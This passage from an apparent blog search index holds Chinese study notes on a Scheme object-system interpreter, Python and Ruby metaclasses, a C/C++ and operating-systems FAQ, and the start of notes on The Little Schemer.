(var exp)                               (let ((value (eval-exp exp env class inst))                                     (c-vals (class-&gt;c-vals (something-&gt;value class))))                                 (void-&gt;expressed                                  (assign! var                                           value                                           (class-&gt;c-vars (something-&gt;value class))                                           c-vals))))                  (method (formals body)                          (let ((new-formals (cons &#x27;self formals)))                            (open-method-&gt;expressed                             (lambda (class-thunk) ;; class has not instanced, wait for the class here                               (lambda (args)                                 (eval-exp                                  body                                  (extend-env new-formals (map expressed-&gt;denoted args) env)                                  (make-something (class-thunk))                                  (make-something (car args))))))))                  (meth-app (name rands)                            (let ((args (map (lambda (rand)                                               (eval-exp rand env class inst))                                             rands)))                              (meth-call name (instance-&gt;class (car args)) args)))                  (new-simpleinst (class-exp)                                  (let ((inst-class (eval-exp class-exp env class inst)))                                    (let ((new-inst (make-instance inst-class                                                                   (make-vals (class-&gt;i-vars inst-class)))))                                      (ignore (meth-call &#x27;initialize inst-class (list new-inst)))                                      new-inst)))                  (new-simpleclass (c-vars i-vars methdecls init-exp)                                   (let ((open-methods                                          (map (lambda (decl)                                                 (expressed-&gt;open-method                                                  (eval-exp (decl-&gt;exp decl) env class inst)))                                               methdecls)))                                     (letrec ((new-class                                               (make-class                                                c-vars                                                (make-vals c-vars)                                                i-vars                                                (extend-method-env                                                 (map decl-&gt;var methdecls)                                                 (map (lambda (open-meth)                                                        (open-meth (lambda () new-class)))                                                      open-methods)                                                 init-meth-env))))                                       (ignore (eval-exp init-exp                                                         env                                                         (make-something new-class)                                                         (make-nothing)))                                       new-class)))))\ninherence\n現在class可以往上找，所以多一個parent指到另一個class\n(define-record instance (class i-vals))(define-record class (parent c-vars c-vals i-vars m-env))(lambda (exp env class inst)    (variant-case exp                  (new-class (parent-exp c-vars i-vars methdecls init-exp)                             (let ((parent-class (eval-exp parent-exp env class inst))                                   (open-methods                                    (map (lambda (decl)                                           (expressed-&gt;open-method                                            (eval-exp (decl-&gt;exp decl) env class inst)))                                         methdecls)))                               (let ((new-c-vars (append c-vars (class-&gt;c-vars parent-class)))                                     (new-i-vars (append i-vars (class-&gt;i-vars parent-class)))                                     (new-c-vals ; NEW!                                      (make-shared-c-vals (class-&gt;c-vals parent-class) c-vars)))                                 (letrec ((new-class                                           (make-class                                            (make-something parent-class)                                            new-c-vars                                            new-c-vals                                            new-i-vars                                            (extend-method-env                                             (map decl-&gt;var methdecls)                                             (map (lambda (open-method)                                                    (open-method (lambda () new-class)))                                                  open-methods)                                             (class-&gt;m-env parent-class)))))                                   (ignore                                    (eval-exp init-exp                                              env                                              (make-something new-class)                                              (make-nothing)))                                   new-class))))                  (super-meth-app (name rands)                                  (let ((args (map (lambda (x) (eval-exp x env class inst)) rands)))                                    (meth-call name                                               (something-&gt;value                                                (class-&gt;parent                                                 (something-&gt;value class)))                                               (cons (something-&gt;value inst) args))))                  ;; Figure 7.1.3 : page 219                  (i-varref (var)                            (lookup var                                    (class-&gt;i-vars (something-&gt;value class))                                    (instance-&gt;i-vals (something-&gt;value inst))))                  (c-varref (var)                            (lookup var                                    (class-&gt;c-vars (something-&gt;value class))                                    (class-&gt;c-vals (something-&gt;value class))))                  (i-varassign (var exp)                               (let ((value (eval-exp exp env class inst)))                                 (void-&gt;expressed                                  (assign! var                                           value                                           (class-&gt;i-vars (something-&gt;value class))                                           (instance-&gt;i-vals (something-&gt;value inst))))))                  (c-varassign (var exp)                               (let ((value (eval-exp exp env class inst))                                     (c-vals (class-&gt;c-vals (something-&gt;value class))))                                 (void-&gt;expressed                                  (assign! var                                           value                                           (class-&gt;c-vars (something-&gt;value class))                                           c-vals))))                  (method (formals body)                          (let ((new-formals (cons &#x27;self formals)))                            (open-method-&gt;expressed                             (lambda (class-thunk)                               (lambda (args)                                 (eval-exp                                  body                                  (extend-env new-formals (map expressed-&gt;denoted args) env)                                  (make-something (class-thunk))                                  (make-something (car args))))))))                  (meth-app (name rands)                            (let ((args (map (lambda (rand)                                               (eval-exp rand env class inst))                                             rands)))                              (meth-call name (instance-&gt;class (car args)) args)))                  (new-simpleinst (class-exp)                                  (let ((inst-class (eval-exp class-exp env class inst)))                                    (let ((new-inst (make-instance inst-class                                                                   (make-vals (class-&gt;i-vars inst-class)))))                                      (ignore (meth-call &#x27;initialize inst-class (list new-inst)))                                      new-inst)))                  ;; The following is a convenience to make old examples work (stackclass).                  ;; Syntax-expand can&#x27;t handle simpleclass, because then it would be                  ;; expanded away in section 7.1                  (new-simpleclass (c-vars i-vars methdecls init-exp)                                   (eval-exp (make-new-class (make-varref &#x27;baseobject)                                                             c-vars i-vars methdecls init-exp)                                             env class inst))))\nmetaclass\n從繼承那邊可以看出來，其實parent與class(struct中的ptr)很像，都是往被指到的東西中找值，所以其實我們也不用區分是class還是instance\n把class與instance和在一起，會發現，我們不需要c-vals與c-vars，因為\n\n如果要instance變數，就看i-vals\n如果要class變數，就看class的i-vals\n\n到這裡就可以知道，為什麼python與ruby的class都可以有自己的變數，同時可以在某種程度上當class變數用\n(define-record instance (class parent i-vars m-env i-vals))(lambda (exp env class inst)  (variant-case exp                (c-varref (var)                           (lookup var                                  (class-&gt;i-vars                                   (something-&gt;value                                    (instance-&gt;class                                     (something-&gt;value class))))                                  (instance-&gt;i-vals                                   (something-&gt;value class))))                (c-varassign (var exp)                             (let ((value (eval-exp exp env class inst)))                               (void-&gt;expressed                                (assign! var                                         value                                         (class-&gt;i-vars                                          (something-&gt;value                                           (instance-&gt;class                                            (something-&gt;value class))))                                         (instance-&gt;i-vals                                          (something-&gt;value class))))))                (new-instance (class-exp parent-exp i-vars methdecls)                              (let ((inst-class (eval-exp class-exp env class inst))                                    (parent-class (eval-exp parent-exp env class inst))                                    (open-methods                                     (map (lambda (decl)                                            (expressed-&gt;open-method                                             (eval-exp (decl-&gt;exp decl) env class inst)))                                          methdecls)))                                (let ((new-i-vars (append i-vars (class-&gt;i-vars parent-class))))                                  (letrec ((new-inst                                            (make-instance                                             (make-something inst-class)                                             (make-something parent-class)                                             new-i-vars                                             (extend-method-env (map decl-&gt;var methdecls)                                                                (map (lambda (open-method)                                                                       (open-method (lambda () new-inst)))                                                                     open-methods)                                                                (class-&gt;m-env parent-class))                                             (make-vals (class-&gt;i-vars inst-class)))))                                    (ignore (meth-call &#x27;initialize inst-class (list new-inst)))                                    new-inst))))                ;; Figure 7.2.4 : page 228                (super-meth-app (name rands)                                (let ((args (map (lambda (x) (eval-exp x env class inst)) rands)))                                  (meth-call name                                             (something-&gt;value                                              (class-&gt;parent                                               (something-&gt;value class)))                                             (cons (something-&gt;value inst) args))))                ;; Figure 7.1.3 : page 219                (i-varref (var)                          (lookup var                                  (class-&gt;i-vars (something-&gt;value class))                                  (instance-&gt;i-vals (something-&gt;value inst))))                (i-varassign (var exp)                             (let ((value (eval-exp exp env class inst)))                               (void-&gt;expressed                                (assign! var                                         value                                         (class-&gt;i-vars (something-&gt;value class))                                         (instance-&gt;i-vals (something-&gt;value inst))))))                (method (formals body)                        (let ((new-formals (cons &#x27;self formals)))                          (open-method-&gt;expressed                           (lambda (class-thunk)                             (lambda (args)                               (eval-exp                                body                                (extend-env new-formals (map expressed-&gt;denoted args) env)                                (make-something (class-thunk))                                (make-something (car args))))))))                (meth-app (name rands)                          (let ((args (map (lambda (rand)                                             (eval-exp rand env class inst))                                           rands)))                            (meth-call name                                       (something-&gt;value (instance-&gt;class (car args)))                                       args)))))\npython\n從剛剛metaclass的struct來看，先不管i-vals與i-vars與m-env\n看到下面的code的class C\n可以發現 B 是 parent，而A是 class\n再看到type.__new__(ins, name,parent,attrs)\nattrs就是Dict，可以放值或是function，可以當成i-vals與i-vars與m-env的結合\n所以ins是 class， parent是parent，這裡生的就是instance\n剛剛是把python的metaclass與之前說的metaclass做結合，\n剩下的部分就是__new__與__init__，__new__就是會丟出instance，而__init__就是instance的終點\n另外super就是找繼承鍊上的instance，詳情可以看Ref的文章\nclass A(type):    def __new__(ins, name, parent, attrs):        print(&quot;in A&quot;)        attrs[&#x27;ins_var_of_C&#x27;] = 101        ins.class_var_of_C = &#x27;123&#x27;        ret = type.__new__(ins, name,parent,attrs)        return ret    def from_A(self):        return 1000class B(object):    def __new__(ins):        print(&quot;in B&quot;)        ins.b = 19        return super().__new__(ins)class C(B,metaclass=A):    def __new__(ins):        print(&quot;in C&quot;)        ins.from_here = 876        return super().__new__(ins)    def __init__(self):        self.a = 999C.from_A()c = C()print(c.b)print(c.a)print(c.from_here)print(C.ins_var_of_C)print(C.class_var_of_C)print(c.ins_var_of_C)\nruby\n與python不同的是，class的部分(metaclass in Python)，沒有指定的機會，Ruby會自己生\n但是Ruby有eval來做許多壞事\ninstance_eval 就是用 之前提到的instance來做eval，可以想像成用instance的所有資料作為跑code的環境\nclass_eval 其實就是會檢查 執行的obj是不是class，其實用{class}.instance_eval是等於{class}.class_eval的\nclass Object   # The hidden singleton lurks behind everyone   def metaclass; class &lt;&lt; self; self; end; end   def meta_eval &amp;blk; metaclass.instance_eval &amp;blk; end   # Adds methods to a metaclass   def meta_def name, &amp;blk     meta_eval &#123; define_method name, &amp;blk &#125;   end   # Defines an instance method within a class   def class_def name, &amp;blk     class_eval &#123; define_method name, &amp;blk &#125;   end end class MailTruck   def self.company( name )     meta_def :company do; name; end     # 吃當下的class的metaclass來加method，也就是替被執行該method的class加一個class method，叫company   end end  class HappyTruck &lt; MailTruck   company &quot;Happy&#x27;s -- We Bring the Mail, and That&#x27;s It!&quot; end  class Creature   def self.traits( *arr )     return @traits if arr.empty?     attr_accessor *arr     arr.each do |trait|       meta_def trait do |val|         @traits ||= &#123;&#125;         @traits[trait] = val       end     end     class_def :initialize do       self.class.traits.each do |k,v|         instance_variable_set( &quot;@#&#123;k&#125;&quot;, v )       end     end     class_def :hi do      self.class.traits.each do |k,_|        puts &quot;#&#123;self.instance_eval &quot;self.#&#123;k&#125;&quot;&#125;&quot;      end    end   end end class A &lt; Creature  traits :a, :b, :c end A.a 10 A.b 20 A.c 30 x = A.new y = A.new puts &quot;x content&quot;x.hiputs &quot;y content&quot;y.hiputs &quot;change&quot;y.b = 100y.hi\nRef\nEoPL1 Ch10\nMetaprogramming in Ruby\n你不知道的 super\n","categories":["Rails","FAQ"]},{"title":"C/C++的FAQ","url":"/2020/12/c-faq/","content":"動機\n整理一些之前的問題\n\nextern, static, global\nextern 的意思是去外面找，去其他的程式中找在哪\nstatic 的意思是只在這個範圍存活&amp;可見，用這個方式來看file(global)、function、class(only for c++)的static變數，就會很一致了\n下面的三個code就是demo extern的用處\nextern之後，a就可以用了\n但是對於有static的global變數，linker會找不到他\naaa.cpp\nint a = 10;int b = 100;static int c = 1000;void x()&#123;a--;&#125;void y()&#123;b--;&#125;\naaa.hpp\nextern int b;void x();void y();\nbbb.cpp\n#include &quot;aaa.hpp&quot;#include &lt;iostream&gt;int main() &#123;\t//std::cout &lt;&lt; a; error\tstd::cout &lt;&lt; b &lt;&lt; &#x27;\\n&#x27;;\ty();\tstd::cout &lt;&lt; &quot;after y: &quot; &lt;&lt; b &lt;&lt; &#x27;\\n&#x27;;\tb--;\tstd::cout &lt;&lt; &quot;after b--: &quot; &lt;&lt; b &lt;&lt; &#x27;\\n&#x27;;\textern int a;\tstd::cout &lt;&lt; a;\tx();\tstd::cout &lt;&lt; &quot;after a: &quot; &lt;&lt; a &lt;&lt; &#x27;\\n&#x27;;\ta--;\tstd::cout &lt;&lt; &quot;after a--: &quot; &lt;&lt; a &lt;&lt; &#x27;\\n&#x27;;  // extern static int c; // linker fails, cant find c&#125;\nextern “C”\n在C++中函數可以overload，所以C++的函數其實編譯出來後名字會被加料，但\n如果要include一些用c寫好的函數就會出事，名字會對不上，所以要用extern &quot;C&quot;\n用extern &quot;C&quot;就是說這段不要加料，照C的方式來\nuse C lib in C++\n/* fromc.h */#ifdef __cplusplusextern &quot;C&quot; int get10();#elseint get10();#endif/* fromc.c */int get10() &#123;return 10;&#125;\n// useclib.cpp#include &lt;iostream&gt;#include &quot;fromc.h&quot;int main() &#123;    std::cout &lt;&lt; get10() &lt;&lt; &#x27;\\n&#x27;;&#125;\nuse C++ lib in C\n// fromcpp.hppint get20_for_C();// fromcpp.cppint get20() &#123;return 20;&#125;extern &quot;C&quot; &#123;    int get20_for_C() &#123;return get20();&#125;&#125;\n/* usecpplib.c */#include &lt;stdio.h&gt;#include &quot;fromcpp.hpp&quot;int main() &#123;    printf(&quot;%d\\n&quot;, get20_for_C());&#125;\nstatic 為什麼放在.data\n程式在記憶體中會有\n\nstack&amp;heap\na. stack: 放local var與函數的call stack\nb. heap: 動態allocate的東西\nbss: uninit的static\ndata: 放 全域變數與常數\ntext: 程式碼\n\ndata 與 stack&amp;heap 的差別是?\ndata的資料只要程式還在跑，就不會消失\nstack&amp;heap的資料隨時都有可能消失\n所以static 為什麼放在.data?\n因為static隨時都要存活，所以不能放在stack&amp;heap，那就只能放在data\nabout C++ class\nfriend\nstruct A &#123;  void normal_method() &#123;&#125;  friend void friend_method(A&amp; me) &#123;&#125;&#125;;int main() &#123;  A a;  //原本的method call  a.normal_method();  //不想放前面的method call，當然不一定是只能傳自己，這就是函數可以多個  friend_method(a);&#125;\nvirtual\n有標virtual就是會在runtime時依據實際上的type去找method執行，如果沒有就是依據變數的type\n#include &lt;iostream&gt;struct A &#123;void x() &#123;std::cout &lt;&lt; &quot;x\\n&quot;;&#125;virtual void y() &#123;std::cout &lt;&lt; &quot;y\\n&quot;;&#125;&#125;;struct B : public A &#123;void x() &#123;std::cout &lt;&lt; &quot;x2\\n&quot;;&#125;virtual void y() &#123;std::cout &lt;&lt; &quot;y2\\n&quot;;&#125;&#125;;int main() &#123;        A* a = new B();        a-&gt;x(); // x        a-&gt;y(); // y2        ((B*)a)-&gt;x(); // x2        delete a; &#125;\n注意: constructor不能是virtual\nconstructor本來就是從new時的type建立回去，所以不需要virtual\n另一個說法是new物件時還沒有virtual的table，所以不能是virtual\n但destructor需要，因為如果像上面的code去刪一個parent指標，時沒有virtual，會從parent的destructor去跑，這就尷尬了\nobject slicing\n就是從child轉到parent會讓child的東西不見，這就是slicing\n但是，因為cpp有copy，事情可能會搞砸\n如果從child到parent是用copy的話，就不會根據原本的資料去找attribute與method，同時如果要轉回去也會出事(要記得用dynamic_casr轉啊)\nclass Base&#123;protected:    int m_value&#123;&#125;; public:    Base(int value) : m_value&#123; value &#125; &#123;&#125;     virtual const char* getName() const &#123; return &quot;Base&quot;; &#125;    int getValue() const &#123; return m_value; &#125;&#125;; class Derived: public Base&#123;public:    Derived(int value) : Base&#123; value &#125; &#123;&#125;     virtual const char* getName() const &#123; return &quot;Derived&quot;; &#125;&#125;; void printName(const Base base) // note: base passed by value, not reference&#123;    std::cout &lt;&lt; &quot;I am a &quot; &lt;&lt; base.getName() &lt;&lt; &#x27;\\n&#x27;;&#125;int main()&#123;    Derived derived&#123; 5 &#125;;    std::cout &lt;&lt; &quot;derived is a &quot; &lt;&lt; derived.getName() &lt;&lt; &quot; and has value &quot; &lt;&lt; derived.getValue() &lt;&lt; &#x27;\\n&#x27;;     Base &amp;ref&#123; derived &#125;; // ok    std::cout &lt;&lt; &quot;ref is a &quot; &lt;&lt; ref.getName() &lt;&lt; &quot; and has value &quot; &lt;&lt; ref.getValue() &lt;&lt; &#x27;\\n&#x27;;     Base *ptr&#123; &amp;derived &#125;; // ok    std::cout &lt;&lt; &quot;ptr is a &quot; &lt;&lt; ptr-&gt;getName() &lt;&lt; &quot; and has value &quot; &lt;&lt; ptr-&gt;getValue() &lt;&lt; &#x27;\\n&#x27;;    Base base&#123; derived &#125;; // be sliced    std::cout &lt;&lt; &quot;base is a &quot; &lt;&lt; base.getName() &lt;&lt; &quot; and has value &quot; &lt;&lt; base.getValue() &lt;&lt; &#x27;\\n&#x27;;    printName(derived); // be sliced    return 0;&#125;\nthe rule of five\n如果定義了自己的\n\ndestructor\ncopy constructor\ncopy assignment\n\n就要把其他的也一起定義完\n不過因為C++11有move，所以要多兩個\n\nmove constructor\nmove assignment\n\nclass rule_of_five&#123;    char* cstring; // raw pointer used as a handle to a dynamically-allocated memory block public:    rule_of_five(const char* s = &quot;&quot;)    : cstring(nullptr)    &#123;         if (s) &#123;            std::size_t n = std::strlen(s) + 1;            cstring = new char[n];      // allocate            std::memcpy(cstring, s, n); // populate         &#125;     &#125;     ~rule_of_five()    &#123;        delete[] cstring;  // deallocate    &#125;     rule_of_five(const rule_of_five&amp; other) // copy constructor    : rule_of_five(other.cstring)    &#123;&#125;     rule_of_five(rule_of_five&amp;&amp; other) noexcept // move constructor    : cstring(std::exchange(other.cstring, nullptr))    &#123;&#125;     rule_of_five&amp; operator=(const rule_of_five&amp; other) // copy assignment    &#123;         return *this = rule_of_five(other);    &#125;     rule_of_five&amp; operator=(rule_of_five&amp;&amp; other) noexcept // move assignment    &#123;        std::swap(cstring, other.cstring);        return *this;    &#125; // alternatively, replace both assignment operators with //  rule_of_five&amp; operator=(rule_of_five other) noexcept//  &#123;//      std::swap(cstring, other.cstring);//      return *this;//  &#125;&#125;;\nOS related\nEdge Trigger &amp; Level Trigger\n\nEdge Trigger: 狀態變化時產生io事件\nLevel Trigger: 滿足條件時產生io事件\n\nmemory\n\nmemory hierarchy\n\nregister\ncache memory\nmain memory\nHDD\n\n\nDirect Memory Access, DMA\n\n讓device可以直接操作記憶體，像是device把資料copy到mem去\n\n會導致cache不一致!! (因為直接改mem，但cache不知道)\n\n寫入mem時要通知cache做invalidate\n讀cache時，dma已經開始(拿到最新的) 或 dma關閉(不會被改)\n\n\n\n\n不然cpu就要中斷自己去做\n由cpu啟動dma，剩下的事情就是dma controller的工作\n\n\n\nmutex &amp; semaphore\n\nmutex\n\n受益人數: 一人\n誰能改變狀態(上鎖):\na. 還沒上鎖: 所有人\nb. 上鎖了: 上鎖的人\n使用場域: 保護critical zone\n\n\nsemaphore\n\n受益人數: 看設定多少\n誰能改變狀態(記數): 誰都ok\n使用場域: 同步時的signal\n\n\n\nBig Endian &amp; Little Endian\n資料放進記憶體中的時\n\nBig-Endian(Network Order): 最高位的位元組會放在最低的記憶體位址上\nLittle-Endian: 最高位的位元組放在最高的記憶體位址上\n\n記憶體的最高在右邊，但資料的最高在左手邊\nHigh -&gt; 12345678 &lt;- LowLow -&gt; a[0], a[1], a[2], a[4] &lt;- High\n#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#include &lt;arpa/inet.h&gt;typedef union &#123;  uint32_t l;  unsigned char c[4];&#125; EndianTest;// 輸出位元組順序void printBytes(uint32_t x) &#123;  EndianTest et;  et.l = x;  for (int i = 0; i &lt; 4; i++) &#123;    printf(&quot;0x%02X &quot;, et.c[i]);  &#125;  printf(&quot;n&quot;);&#125;int main() &#123;  uint32_t x = 0x12345678;  // big: 12, 34, 56, 78  // little: 78, 56, 34, 12  printf(&quot;0x%X 在記憶體中的儲存順序：&quot;, x);  printBytes(x);  uint32_t n = htonl(x);  printf(&quot;0x%X 在網路中的傳輸順序：&quot;, x);  printBytes(n);&#125;\nhow to IPC\n\npipe(named pipe)\npopen\nmessage queue\nsemophore\nsignal\nshared memory\nsocket\nfile\n\ndeadlock condition\nrace condition: 輸出依據不受控制的事件出現順序或者出現時機\nCritical section: access共享資源的code\nsynchronization: 協調讓thread使用Critical section在時間上一致與統一\nCache coherence: 快取一致性 (為什麼放這邊?，可以看volatile)\n\n資源唯一(互斥) =&gt; a node in a graph\n不會被搶(不可搶占) =&gt; node cant be removed\n拿著並等別的資源(占有且等待) =&gt; an edge to other node\n別人也在等我(循環等待) =&gt; cycle\n\nthread &amp; process\n\nprocess: OS的資源分配單位，彼此不影響\nthread: 程式的執行單位，互相影響\na. a kernel thread to a user thread: linux’s clone(child process, LWP)\nb. a kernel thread to many user threads\nc. many kernel threads to many user threads\n\nhow to talk to kernel\n\nvirtual filesystems(e.g. /proc, /sys, configfs, relayfs): kernel &lt;-&gt; user, exchange data\nnetlink/UDP socket: kernel &lt;-&gt; user, exchange data\nmmap: kernel &lt;-&gt; user, exchange data\nsyscall: user -&gt; kernel, invoke function\nioctl: kernel &lt;-&gt; user, exchange data\nsignal from kernel: kernel -&gt; user, invoke handler\nupcall: kernel -&gt; user, invoke a function\n\nref\nvolatile\n就是叫compiler每次都乖乖重新拿值，不然可能有神秘的優化把變數消滅掉\n用處\n\nregister\n在multi-thread共用的變數\n一個中斷服務子程序中會訪問到的非自動變量(Non-automatic variables)\n\nCan we use “const” and “volatile” in the same variable?\nextern const volatile unsigned int rt_clock;\n用在監看reg的值的時候\nmalloc、calloc、realloc\n\nmalloc: 就是allocate\ncalloc: allocate + 初始值\nrealloc: resize但是不一定從原本的位置開始，所以會copy舊資料到新位置\n\npointer size\n看記憶體是幾位元的\n\n64: 8 bytes\n32: 4 bytes\n\nmacro\n一些工具\n\nconcat\n\n  #define cons(a,b) a##b// cons(1,2) =&gt; 12\n\n可變參數(預設參數)，如果有尾巴的逗號會被吃掉 (C99)\n\n  #define foo(must, ...) _foo(must, (foo_args)&#123;.a = 8, .b = 3.14, __VA_ARGS__&#125;);// foo(&#x27;D&#x27;, .b = 9, .a = 2);\n\nto_string\n\n  #define STR(s) #s// STR(123) =&gt; &quot;123&quot;\n\n_Generic (C11, 就是泛型)\n\n  #define foo(a, b)                \\    _Generic((a),                \\        int: func1,               \\        double: _Generic((b),    \\                    int : func2,  \\                    double: func3 \\                )                \\    )(a, b)\n使用時要注意\n\n用括號\n\n  #define pow(a) (a) * (a)// pow(1+2) =&gt; (1+2) * (1+2)\n\n如果有temp變數要加大括號，不然會汙染到原本的scope\n\n  #define swap(a, b) &#123; \\    int temp = a;    \\    a = b;           \\    b = temp;        \\&#125;\n\n幫數字標上type\n\n  #define NUM (100*123*234UL)// 注意: 型別要放在數字後面!!// U for unsigned// L for long int or long float// F for float// default: double or int\n\n如果要用macro在另一個macro要多一層讓macro先展開\n\n  #define A 2#define CONS(a,b) a##b// CONS(A,A) =&gt; AA#define _CONS(a,b) a##b#define CONS_GOOD _CONS(a,b)// CONS_GOOD(A,A) =&gt; _CONS(2,2) =&gt; 22\nuseful macro &amp; case study\n#include &lt;stdio.h&gt;#define debug(fmt, ...) &#123; \\    fprintf(stderr, &quot;(%s:%d) &quot;fmt&quot;\\n&quot;, __FILE__, __LINE__, ##__VA_ARGS__); \\&#125;int main(void) &#123;    debug(&quot;%s %d&quot;, &quot;Shit happen!&quot;, 1);    return 0;&#125;\n#define hash_hash # ## ##define mkstr(a) # a#define in_between(a) mkstr(a)#define join(c, d) in_between(c hash_hash d)//join(x, y)//in_between(x hash_hash y)//in_between(x ## y)//mkstr(x ## y)\ndefault args: 在函數做設定\n#include &lt;stdio.h&gt;#define f(...) def_f((f_args) &#123;__VA_ARGS__&#125;)typedef struct &#123;    int i;    double j;&#125; f_args;void real_f(int i, double j) &#123;    printf(&quot;%i %f\\n&quot;,i,j);&#125;void def_f(f_args args) &#123;    int i = args.i ? args.i : 10;    double j = args.j ? args.j : 10.5;    real_f(i,j);&#125;int main() &#123;    f(3,8);    f(.j=100.2, .i=4);    f(2);    f(.j=45.3);    f();    f(12,);    return 0;&#125;\ndefault args: 在struct(macro展開時)做設定\n#include &lt;stdio.h&gt;#define f(...) def_f((f_args)&#123;.i=10, .j=10.5, __VA_ARGS__&#125;)typedef struct &#123;    int i;    double j;&#125; f_args;void real_f(int i, double j) &#123;    printf(&quot;%i %f\\n&quot;,i,j);&#125;void def_f(f_args x) &#123;    real_f(x.i,x.j);&#125;int main() &#123;    //f(3,8);    f(.j=100.2, .i=4);    //f(2);    f(.j=45.3);    f();    //f(12,);    return 0;&#125;\nfloating point\n\n不要直接比較，要變成看相對誤差\n\nabs((0.1+0.2)-0.3) &lt; epsilon\n\n\n少用float做直接運算，轉成整數\n\n\n使用另外設計的Lib\n\n\n調整算式\n\n\n豐富的case\nISR\n__interrupt double compute_area(double radius) // 1. no args (這應該是上半部)&#123;  double area = PI * radius * radius; // 2. kernel space 用float?!  printf(&quot;\\nArea = %f&quot;， area); // 3. 在中斷跑IO!?  return area; // 4. irq沒有return，syscall有&#125;\npitfall\nauto cast\n有unsigned就會自動變成unsigned\nvoid foo(void)&#123;  unsigned int a = 6;  int b = -20;  (a+b &gt; 6) ? puts(&quot;&gt; 6&quot;) : puts(&quot;&lt;= 6&quot;); // &gt; 6&#125;\ntype size\n只有char確定是1byte!!\n所以下面的code可能會出事，因為unsigned int不一定是4bytes\nunsigned int zero = 0;unsigned int compzero = 0xFFFF; /*1&#x27;s complement of zero */\n\n\n\ntype\nsize\n\n\n\n\nchar\n1 byte\n\n\nunsigned char\n1 byte\n\n\nsigned char\n1 byte\n\n\nint\n2 or 4 bytes\n\n\nunsigned int\n2 or 4 bytes\n\n\nshort\n2 bytes\n\n\nunsigned short\n2 bytes\n\n\nlong\n8 bytes or (4bytes for 32 bit OS)\n\n\nunsigned long\n8 bytes\n\n\n\np++ &amp; ++p\n就算有括號，p++的inc還是後做，++p的inc還是先做\nint a[5]=&#123;1,2,3,4,5&#125;;int *p=a;*(p++)+=123;*(++p)+=123;//124 2 126 4 5\ntypedef\n#define dPS struct s *typedef struct s * tPS;dPS p1,p2; // =&gt; struct s * p1,p2;tPS p3,p4;// =&gt; struct s *p1,*p2;\npointer &amp; array type\n先看array，再看pointer，有括號就先看括號\nint a[10]; // An array of 10 integersint *a[10]; // An array of 10 pointers to integers// int ((*a)[10])int (*a)[10]; // A pointer to an array of 10 integersint (*a)(int); // A pointer to a function a that takes an integer argument and returns an integerint (*a[10])(int); // An array of 10 pointers to functions that take an integer argument and return an integer\nconst &amp; pointer\nint const *a; // ptr的內容固定int * const a; // 被指到的int固定const int const * a; // 兩個都固定\n計組\nPipeline\n\ninstruction fetch\ninstruction decode/fetch register\ninstruction execute/ branch or jump\nmemory access\n\n\nto mem\n\n\nwrite back\n\n\nto reg\n\n因為現在是所有指令共用datapath，所以要pipeline reg讓stage去load需要的資料去完成每個階段的任務\nharzards\n\nData Hazard\n\nLoadStore (RAW): 還沒寫完就被讀(拿到舊的值)\nStoreStore (WAW): 前面還沒寫完，後面已經寫進去了\nStoreLoad (WAR): 來沒讀完就被寫(拿到未來的值)\nsol\n\ncompiler 或是 cpu的 stall\nforwarding: 把需要的資訊丟到後面的pipeline reg，讓後面的stage先做事\n\n\n\n\nControl Hazard\n\nif 的 bool還沒被算出來!!\nsol\n\nstall\n分支預測(猜)\n\n\n\n\nStructural hazard\n\n在pipeline上指令的需要同一個資源\nsol\n\nstall\n亂序執行\n\n\n\n\n\nNetwork Programming\nserver\n\nsocket\n\nnew socket()\n\n\nbind\n\n填ip, port\n\n\nlisten\n\nsocket.start()\n\n\naccept (可以去看block-nonblock-sync-async補一下block與non-block的知識)\n\nloop -&gt; get socket\nread / write\nclose\n\n\n\nclient\n\nsocket\nconnect\nwrite / read\nclose\n\n傳struct\n不能直接傳，大小頭、padding、type的size不一定會一樣，會可能會轉不回來\n\n轉成string\n用htonl與ntohl，自己把int轉一轉\n\n\nhost order to network order long (integer, s是short integer)\nnetwork order to host order long (integer, s是short integer)\n\nfloat就要自己設計格式，沒有htonl與ntohl可以用，不然就是去找序列化的lib，像protobuf\npipe\n\npipefs\ncreate a file in pipefs, which is in mem\nreturn 2 fd, one for writing, another for reading\n\nhow tcpdump works\n\n透過libpcap的api生bpf\n\n除此之外\n\nbit trick\nlvalue, rvalue\ntmp\nMaximum subarray\nlinked list\nbinary search tree\nLRU cache\n\n","categories":["C++","FAQ"]},{"title":"The Little Schemer讀後筆記","url":"/2020/4/TLS/","content":"前言\nThe Little Schemer(TLS)的目的是教讀者寫遞迴。\n這篇筆記不依照章節順序，用主題式的方式，把我心中的這本書呈現出來。\n行前須知\n知道什麼是?\n\nbase 與 inductive case 在歸納法中大概的意思\n\n快速Scheme Tutorial\n調用: (&lt;function-or-operator) &lt;args...&gt;)\n宣告變數: (define &lt;var-name&gt; &lt;value&gt;)\n條件式:\n(if &lt;predicate&gt;  &lt;when-true&gt;  &lt;when-false&gt;)(cond  [&lt;predicate&gt; &lt;do-somthing&gt;]  ...  [else &lt;do-somthing&gt;])\n函數:\n(define &lt;func-name&gt;  (lambda (&lt;args...&gt;)    &lt;do-somthing&gt;));; OR(define (&lt;func-name&gt; (&lt;args...&gt;))    &lt;do-somthing&gt;)\n匿名函數:\n(lambda (&lt;args...&gt;)  &lt;do-somthing&gt;)\n本書用到的資料結構介紹\nAtom\n&lt;line-of-characters&gt;還有數字\nList of OO\n有哪些可能性(case)\n\nbase case: 空\ninductive case: 有東西\n\n建構\n\n空 的case : '()\n有東西 的case : cons\n\n分解\n\n有東西 的case : car 與 cdr\n對應到cons有兩個參數，所以會有兩個解構子。\n\n區分case\n\n空 的case : null?\n\nInteger\n有哪些可能性(case)\n\nbase case: 0\ninductive case: 零以上\n\n建構\n\n0 的case : 0\n零以上 的case : add1\n\n分解\n\n零以上 的case : sub1\n\n區分case\n\n0 的case : zero?\n\nList of List &amp; S-Exp\n後面再說\n在 OO 上做遞迴\n\n遞迴就是分解資料再建構出需要的資料。\n\n所以在寫遞迴程式之前要先問是對什麼資料做遞迴，不同的資料有不同的分解方式。\n先來看看如何分解資料，如何分解資料與資料結構的定義有關。\nList只有兩種case，空的(()) 或是 有一個東西加在前面(cons x (sub-list))\n所以要寫 List of Atom的函數時要區分這兩種case，同時做相對應的處理。\n所以List of Atom的程式大致上都會長成\n(define (&lt;func-name&gt; l ...)  (if (null? l)    &lt;when l is () &gt;    &lt;when l is (cons x (sub-list))&gt;))\nInteger與List of Atom很像，但是\n\n空的 變成 零\n(cons x …) 變成 (add1 …)\n與List of Atom的程式有八十七%像\n\n(define (&lt;func-name&gt; n ...)  (if (zero? n)    &lt;when n is () &gt;    &lt;when n is (cons x (sub-list))&gt;))\n還有一個是List of 